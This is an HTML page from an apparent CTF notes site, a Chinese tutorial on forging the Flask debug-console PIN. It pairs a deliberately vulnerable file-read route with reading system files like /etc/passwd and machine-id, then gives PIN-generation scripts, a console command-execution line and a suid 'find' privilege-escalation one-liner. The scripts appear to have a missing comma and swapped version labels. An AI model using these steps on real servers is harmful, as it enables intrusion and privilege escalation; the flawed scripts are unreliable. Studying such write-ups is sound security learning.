@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN"  class="">
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="keywords" content="">
+    
+    
+    <meta name="description" content="">
+    
+    <meta name="generator" content="teedoc">
+    <meta name="theme" content="teedoc-plugin-theme-default">
+    
+        
+        <meta name="markdown-generator" content="teedoc-plugin-markdown-parser">
+        
+        <script>
+MathJax = {"loader": {"load": ["output/svg"]}, "tex": {"inlineMath": [["$", "$"], ["\\(", "\\)"]]}, "svg": {"fontCache": "global"}};
+</script>
+        
+        <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+        
+        <script src="/static/js/theme_default/pre_main.js"></script>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/prism.min.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/viewer.min.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/dark.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/light.css" type="text/css"/>
+        
+        <script src="/static/js/theme_default/jquery.min.js"></script>
+        
+        <script src="/static/js/theme_default/split.js"></script>
+        
+        <link rel="stylesheet" href="/static/css/search/style.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/custom.css" type="text/css"/>
+        
+    
+    
+    <title>Flask_PIN码伪造 - H4ckVortex</title>
+    
+    <script type="text/javascript">js_vars = {}</script>
+    <script type="text/javascript">metadata = {"tags": [], "date": false, "update": [], "ts": 0, "author": "", "brief": "", "cover": ""}</script>
+</head>
+
+
+<body class="type_doc">
+    
+    <div id="navbar">
+        <div id="navbar_menu">
+            <a class="site_title" href="/">
+                
+                
+                    <h2>H4ckVortex</h2>
+                
+        </a>
+            <a id="navbar_menu_btn"></a>
+        </div>
+        <div id="navbar_items">
+            <div>
+                <ul id="nav_left">
+<li class=""><a  href="/arduino/">Arduino</a></li>
+<li class="active"><a  href="/web/">Web</a></li>
+<li class=""><a  href="/misc/">Misc</a></li>
+<li class=""><a  href="/forensics/">Forensics</a></li>
+<li class=""><a  href="/userscript/">UserScript</a></li>
+<li class=""><a  href="/other/">Other</a></li>
+</ul>
+
+            </div>
+            <div>
+                <ul id="nav_right">
+</ul>
+
+                <ul class="nav_plugins"><li><a id="themes" class="light"></a></li></ul><ul class="nav_plugins"><li><a id="search"><span class="icon"></span><span class="placeholder">搜索</span>
+                            <div id="search_hints">
+                                <span id="search_input_hint">输入关键词，多关键词空格隔开</span>
+                                <span id="search_loading_hint">正在加载，请稍候。。。</span>
+                                <span id="search_download_err_hint">下载文件失败，请刷新重试或检查网络</span>
+                                <span id="search_other_docs_result_hint">来自其它文档的结果</span>
+                                <span id="search_curr_doc_result_hint">当前文档搜索结果</span>
+                            </div></a></li></ul>
+            </div>
+        </div>
+    </div>
+    
+    <div id="wrapper">
+        <div id="sidebar_wrapper">
+            <div id="sidebar">
+                <div id="sidebar_title">
+                    
+                </div>
+                <ul class="show">
+<li class="not_active with_link"><a href="/web/CTF导航.html"><span class="label">CTF导航</span><span class=""></span></a></li>
+<li class="active with_link"><a href="/web/Flask_PIN码伪造.html"><span class="label">Flask_PIN码伪造</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/Flask_session伪造.html"><span class="label">Flask_session伪造</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/2019-技能树-Web-布尔盲注/布尔盲注.html"><span class="label">布尔盲注</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/md5绕过汇总.html"><span class="label">md5绕过汇总</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/PHP小特性.html"><span class="label">PHP小特性</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/SQL注入漏洞.html"><span class="label">SQL注入漏洞</span><span class=""></span></a></li>
+</ul>
+
+            </div>
+        </div>
+        <div id="article">
+            <div id="menu_wrapper">
+                <div id="menu">
+                </div>
+            </div>
+            <div id="content_wrapper">
+                <div id="content_body">
+                    <div id="article_head">
+                        <div id="article_title">
+                            
+                            <h1>Flask_PIN码伪造</h1>
+                            
+                        </div>
+                        <div id="article_tags">
+                            <ul>
+                            
+                            </ul>
+                        </div>
+                        <div id="article_info">
+                        <div id="article_info_left">
+                            <span class="article_author">
+                                
+                            </span>
+                            
+                        </div>
+                        <div id="article_info_right">
+                            
+                        </div>
+                        </div>
+                    </div>
+                    <div id="article_tools">
+                        <span></span>
+                        <span id="toc_btn"></span>
+                    </div>
+                    <div id="update_history">
+                        
+                    </div>
+                    <div id="article_content">
+                        
+                            <h2 id="%E6%BC%8F%E6%B4%9E%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%88%90%E5%9B%A0">漏洞概念及成因</h2>
+<p>Flask 是一个用 Python 编写的，基于 WSGI（Web Server Gateway Interface）和 Jinja2 模板引擎的轻量级 Web 应用框架。</p>
+<p>当 Flask 应用以 Debug 模式启动后，同时也会启动一个调试控制台，可通过浏览器访问<code>/console</code>路由进入，该调试控制台需要 PIN 码才能进入，而 PIN 码在服务端启动应用程序时会显示出来。进入调试控制台后，就可以执行 Python 语句和命令。</p>
+<p>通常情况下，开发人员在开发阶段为了提高效率，会以 Debug 模式启动程序，而到了正式运行阶段，则会关闭 Debug 模式。但是有些粗心的开发人员或运维人员，在程序运行阶段，忘记关闭 Debug 模式，从而给攻击者以可乘之机。当然，进入并使用调试控制台，需要输入正确的 PIN 码。</p>
+<p>我们在靶机上运行如下的 python 程序。</p>
+<p>app.py</p>
+
+<pre class="language-python"><code class="language-python">from flask import Flask, request
+
+app = Flask(__name__)
+
+
+@app.route(&quot;/&quot;)
+def index():
+    return &quot;&lt;h1&gt;[flask]pin码伪造&lt;/h1&gt;&quot;
+
+
+@app.route(&quot;/fileread&quot;)
+def read_file():
+    filename = request.args.get(&quot;filename&quot;)
+    return open(filename).read()
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(debug=True, host=&quot;0.0.0.0&quot;, port=8000)
+</code></pre>
+<p>由于打开了调试模式，在服务端启动该应用程序时则会显示 PIN 码以便于进入调试控制台进行调试。</p>
+
+<pre class="language-console"><code class="language-console">root@VM-8-17-ubuntu:~# python3 app.py
+ * Running on http://192.168.184.200:8000/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 630-164-444
+</code></pre>
+<p>你可以尝试重新运行该程序，会发现显示的 PIN 码并没有发生改变，这说明，PIN 码是根据一些系统参数和相对固定的算法进行生成的。</p>
+<h2 id="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</h2>
+<p>接下来，我们需要配合该网站在<code>/fileread</code>路由下存在的任意文件读取漏洞，读取目标服务器的不同文件，获取重要参数，从而计算出正确的 PIN 码进入调试控制台。</p>
+<p><code>http://192.168.184.200:8000/fileread?filename=1</code><br />
+尝试访问一个目标服务器中并不存在的文件，从而得到 Flask 报错页面，在这个页面上，我们可以得到一个路径<code>/usr/local/lib/python3.6/dist-packages/flask/app.py</code>，这是 python 中 Flask 框架的文件路径，从这个路径名中可以得到 python 的版本号，也可以找到对应的生成 PIN 码的程序路径。</p>
+<p><code>http://192.168.184.200:8000/fileread?filename=/usr/local/lib/python3.6/dist-packages/werkzeug/debug/__init__.py</code><br />
+在这个文件中，存有生成 PIN 码的关键函数<code>get_pin_and_cookie_name()</code>，具体算法生成 PIN 码的逻辑我们在此不予以深究，后续会有相关脚本可以直接使用，需要注意的一点是，不同版本的 python 在生成 PIN 码的算法方面有所区别，所以后续的脚本也会有所不同。</p>
+<h3 id="%E7%94%9F%E6%88%90-PIN-%E7%A0%81%E9%9C%80%E8%A6%81%E5%93%AA%E4%BA%9B%E5%8F%82%E6%95%B0%EF%BC%9F">生成 PIN 码需要哪些参数？</h3>
+<h4 id="username">username</h4>
+<p>为启动该程序的用户名，通过读取文件<code>/etc/passwd</code>的内容进行猜测。</p>
+<h4 id="modname">modname</h4>
+<p>默认值为<code>flask.app</code>。</p>
+<h4 id="appname">appname</h4>
+<p>默认值为<code>Flask</code>。</p>
+<h4 id="moddir">moddir</h4>
+<p>app.py 所在位置的绝对路径，即<code>/usr/local/lib/python3.6/dist-packages/flask/app.py</code>。</p>
+<h4 id="uuidnode">uuidnode</h4>
+<p>当前网络 mac 地址的十进制数，一般通过读取文件<code>/sys/class/net/eth0/address</code>的内容得到16进制结果，转化为10进制即可，其中<code>eth0</code>为相应的网卡名字。</p>
+<p>可以通过如下 python 程序进行转换</p>
+
+<pre class="language-python"><code class="language-python">str = &quot;02:42:93:0a:ef:2e&quot;
+print(int(str.replace(&quot;:&quot;, &quot;&quot;), 16))
+</code></pre>
+<h4 id="machine_id">machine_id</h4>
+<p>每一个机器都会有自已唯一的id，linux 的 id 一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_id</code>中，docker 靶机则存放在<code>/proc/self/cgroup</code>中。</p>
+<p>不同版本的 python 的 machine_id 构成不同<br />
+一般从以下文件/proc/self/cgroup、/etc/machine-id,、/proc/sys/kernel/random/boot_id中的相关内容进行拼接或者单独构成，暂未实验得出具体结果。</p>
+<p>如果想使用<code>/proc/self/cgroup</code>路径，但是<code>self</code>被过滤了，其中的<code>self</code>可以用相关进程的pid去替换，即<code>/proc/1/cgroup</code>，如果<code>cgroup</code>也被过滤了，可以使用<code>mountinfo</code>或者<code>cpuset</code>进行替换。</p>
+<p>不同操作系统的 machine_id 所在路径</p>
+<ul>
+<li>Linux</li>
+</ul>
+<p>etc/machine-id，/proc/sys/kernel/random/boot_id，/proc/self/cgroup</p>
+<ul>
+<li>Windows</li>
+</ul>
+<p>SOFTWARE\Microsoft\Cryptography</p>
+<h3 id="%E7%94%9F%E6%88%90-PIN-%E7%A0%81">生成 PIN 码</h3>
+<p>获取到生成 PIN 码的相关参数后，使用脚本生成 PIN 码。</p>
+<p>python3.8及以上</p>
+
+<pre class="language-python"><code class="language-python">#MD5
+import hashlib
+from itertools import chain
+probably_public_bits = [
+     'flaskweb'
+     'flask.app',
+     'Flask',
+     '/usr/local/lib/python3.7/site-packages/flask/app.py'
+]
+
+private_bits = [
+     '25214234362297',
+     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'
+]
+
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+   h.update(b'pinsalt')
+   num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+   for group_size in 5, 4, 3:
+       if len(num) % group_size == 0:
+          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                      for x in range(0, len(num), group_size))
+          break
+       else:
+          rv = num
+
+print(rv)
+</code></pre>
+<p>python3.8以下</p>
+
+<pre class="language-python"><code class="language-python">#sha1
+import hashlib
+from itertools import chain
+probably_public_bits = [
+    'root'
+    'flask.app',
+    'Flask',
+    '/usr/local/lib/python3.8/site-packages/flask/app.py'
+]
+
+private_bits = [
+    '2485377581187',
+    'b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'
+]
+
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+</code></pre>
+<h3 id="%E8%B0%83%E8%AF%95%E6%8E%A7%E5%88%B6%E5%8F%B0">调试控制台</h3>
+<p>进入调试控制台后可以执行 Python 语句和命令。</p>
+
+<pre class="language-python"><code class="language-python">import os; print(os.popen('ls').read())
+</code></pre>
+<h2 id="%E5%AE%9E%E6%88%98%E6%8B%93%E5%B1%95">实战拓展</h2>
+<p>在此简述笔者曾经做过的某题的情况，成功进入调试控制台后，由于用户权限不够，并不能直接查看到 flag 文件，需要利用调试控制台发起反弹 shell ，后续进一步进行提权操作。</p>
+<p>那此题是通过 suid 提权成功拿到 flag 的，该如何操作呢？</p>
+<h3 id="suid%E6%8F%90%E6%9D%83">suid提权</h3>
+<p>寻找具有 suid 权限的⽂件，因为目前用户权限有限，避免产生⼤量的报错信息，故将错误流重定向到<code>/dev/null</code>，找到<code>/usr/bin/find</code>文件具有 suid 权限，在<a href="https://gtfobins.github.io/"  target="_blank">gtfobins</a>中查到 find 提权的相关 exp，使用即可提权成功。<br />
+<code>find . -exec /bin/sh -p \; -quit</code></p>
+
+                        
+                    </div>
+                </div>
+                <div id="previous_next">
+                    <div id="previous">
+                        
+                        <a href="/web/CTF导航.html">
+                            <span class="icon"></span>
+                            <span class="label">CTF导航</span>
+                        </a>
+                        
+                    </div>
+                    <div id="next">
+                        
+                        <a href="/web/Flask_session伪造.html">
+                            <span class="label">Flask_session伪造</span>
+                            <span class="icon"></span>
+                        </a>
+                        
+                    </div>
+                </div>
+                <div id="comments-container"></div>
+            </div>
+            <div id="toc_wrapper">
+                <div id="toc">
+                    <div id="toc_content">
+                            
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <a id="to_top" href="#"></a>
+    <div id="doc_footer">
+        <div id="footer">
+            <div id="footer_top">
+                <ul>
+<li><a></a><ul><li><a target="_blank" href="/#"></a></li>
+</ul>
+</li>
+</ul>
+
+            </div>
+            <div id="footer_bottom">
+                <ul>
+<li><a target="_blank" href="https://github.com/teedoc/teedoc">Generated by teedoc</a></li>
+</ul>
+
+            </div>
+        </div>
+    </div>
+    
+        <script src="/teedoc-plugin-markdown-parser/mermaid.min.js"></script>
+    
+        <script>mermaid.initialize({startOnLoad:true});</script>
+    
+        <script src="/static/js/theme_default/tocbot.min.js"></script>
+    
+        <script src="/static/js/theme_default/main.js"></script>
+    
+        <script src="/static/js/theme_default/viewer.min.js"></script>
+    
+        <script src="/static/css/theme_default/prism.min.js"></script>
+    
+        <script src="/static/js/search/search_main.js"></script>
+    
+        <script src="/static/js/custom.js"></script>
+    
+        <script type="text/javascript" src="/static/js/live.js"></script>
+    
+</body>
+
+</html>
